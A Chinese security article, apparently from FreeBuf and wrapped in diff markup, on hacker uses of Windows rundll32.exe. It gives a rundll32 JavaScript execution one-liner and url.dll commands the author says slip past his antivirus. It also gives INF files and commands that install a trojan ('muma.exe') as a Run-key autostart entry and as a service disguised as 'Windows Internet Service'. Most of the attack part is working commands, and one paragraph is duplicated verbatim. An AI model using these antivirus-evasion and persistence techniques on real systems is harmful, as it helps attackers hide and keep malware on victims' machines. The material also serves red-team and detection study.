@@ -1,0 +1,49 @@
+*本文原创作者：lcx，本文属FreeBuf原创奖励计划，未经许可禁止转载
+在Windows系统中，为了节省内存和实现代码重用，微软在Windows操作系统中实现了一种共享函数库的方式。这就是DLL（Dynamic Link Library）文件，即动态链接库，这种库包含了可由多个程序同时使用的代码和数据。Rundll.exe 和 Rundll32.exe 的命令行实用程序，通过这两个程序可调用从16位或32位DLL导出的函数。现在Rundll.exe 基本被淘汰，rundll32.exe格式为：RUNDLL32.EXE <dllname>,<entrypoint> <optional arguments>。这本来是微软的一个正常的命令，但是在黑客手里会发生巨大的作用，有些命令不为外人所知，堪称命令行下的蒙面歌王，我为大家来揭面一下，让大家知道它的不为人知的几个功能。
+一、用C++如何写一个简单的被Rundll32.exe调用的dll
+我用Visual studio 2017写了一个简单的代码，内容如下：
+// Dll3.cpp: 定义 DLL 应用程序的导出函数。 // #include "stdafx.h" #include <atlstr.h> extern "C" __declspec(dllexport) void F2( HWND hwnd, // handle to owner window HINSTANCE hinst, // instance handle for the DLL LPTSTR lpCmdLine, // string the DLL will parse int nCmdShow // show state ) { if (strlen(lpCmdLine) != 0) { CString num; num = lpCmdLine; MessageBox(0, "Message body", num ,MB_OK); } else { MessageBox(0, "Message body", "Message title", MB_OK); } }
+全部工程文件我已经传到了https://haiyangtop.cn/dll3.rar。我们在命令行下运行rundll32 dll3.dll ,F2 888，那么就会弹出标题为888的对话框。全部工程文件我已经传到了https://haiyangtop.cn/dll3.rar。我们在命令行下运行rundll32 dll3.dll ,F2 888，那么就会弹出标题为888的对话框。
+二、用Rundll32.exe运行js或vbs的脚本代码
+rundll32 javascript:"\..\mshtml,RunHTMLApplication ";window.execScript("msgbox('a')","vbs");window.close()
+动画里这条命令烂大街了，已经绕不过我本机的火绒了。
+三、用Rundll32.exe执行命令绕过杀毒软件的作法
+命令如下：
+rundll32 url.dll, OpenURL file://c:\windows\system32\calc.exe rundll32 url.dll, OpenURLA file://c:\windows\system32\calc.exe rundll32 url.dll, FileProtocolHandler calc.exe
+这是经过反汇编分析url.dll得出的结果，请记住这3条命令，活学活用，这是干货。上边的三条命令都可以绕开我本机的火绒。你可以多分析system32下的dll，说不定你还有惊喜。
+四、用Rundll32.exe修改注册表
+写一个c:/reg.inf文件，增加注册表启动项，代码如下：
+[Version] Signature="$WINDOWS NT$" [DefaultInstall] AddReg=My_AddReg_Name DelReg=My_DelReg_Name [My_AddReg_Name] HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,KAVRun,0x00000000,c:/muma.exe
+然后我们运行
+rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 c:/reg.inf
+就可以增加一个键为KAVRun，值为c:/muma.exe的注册表项了。
+删掉刚才加的注册表启动项，c:\reg.inf内容如下：
+[Version] Signature="$WINDOWS NT$" [DefaultInstall] AddReg=My_AddReg_Name DelReg=My_DelReg_Name [My_DelReg_Name] HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,KAVRun
+运行以下命令就可以删掉了
+rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 c:/reg.inf
+几点说明：
+[Version]和[DefaultInstall]是必须的，AddReg和DelReg至少要有一个。My_AddReg_Name和My_DelReg_Name可以自定义。 0x00010001表示REG_DWORD数据类型，0x00000000或省略该项(保留逗号)表示REG_SZ(字符串)。0x00020000表示REG_EXPAND_SZ。关于inf文件的详细信息，可以参考DDK帮助文档。 InstallHinfSection是大小写敏感的。它和setupapi之间只有一个逗号，没有空格。128表示给定路径，该参数其他取值及含义参见MSDN。特别注意，最后一个参数，必须是inf文件的全路径，不要用相对路径。 inf文件中的项目都是大小写不敏感的。
+五、使用rundll32.exe 增加一个服务
+写一个srv.inf，内容如下：
+[Version] Signature="$WINDOWS NT$" [DefaultInstall.Services] AddService=inetsvr,,My_AddService_Name [My_AddService_Name] DisplayName=Windows Internet Service Description=提供对 Internet 信息服务管理的支持。 ServiceType=0x10 StartType=2 ErrorControl=0 ServiceBinary=%11%\muma.exe
+然后执行命令，会增加一个名字为inetsvr的服务。
+rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 c:/srv.inf
+几点说明：
+ServiceType表示服务类型：0x10为独立进程服务，0x20为共享进程服务（比如svchost）； StartType表示启动类型：0 系统引导时加载，1 OS初始化时加载，2 由SCM（服务控制管理器）自动启动，3 手动启动，4 禁用。 ErrorControl表示错误控制：0 忽略，1 继续并警告，2 切换到LastKnownGood的设置，3 蓝屏。 ServiceBinary里的服务程序位置：%11%表示system32目录，%10%表示系统目录(WINNT或Windows)，%12%为驱动目录system32\drivers。其他取值参见DDK。你也可以不用变量，直接使用全路径。 这四项是必须要有的。
+删除刚才增加的服务，写一个dsrv.inf，内容如下：
+[Version]
+Signature="$WINDOWS NT$" [DefaultInstall.Services] DelService=inetsvr
+执行完以下命令就会删掉了
+rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 c:/dsrv.inf
+INF的具体参数是请查看DDK相关资料。
+六、网上老生常谈的rundll32的几十个常用快捷命令了，可能有些人并不清楚
+命令列: rundll32.exe shell32.dll,Control_RunDLL
+功能: 显示控制面板
+命令列: rundll32.exe shell32.dll,Control_RunDLL access.cpl,,1
+功能: 显示“控制面板－辅助选项－键盘”选项视窗
+命令列: rundll32.exe shell32.dll,Control_RunDLL access.cpl,,2
+功能: 显示“控制面板－辅助选项－声音”选项视窗
+……
+还有太多太多，我如果写在文章里就全是水份了，具体其它命令请参阅：老生常谈的一些命令
+另：本文中的修改注册表和增删服务参考了zzzevazzz的《Do All in Cmd Shell (一切尽在命令行)》部分内容，表示感谢。
+*本文原创作者：lcx，本文属FreeBuf原创奖励计划，未经许可禁止转载
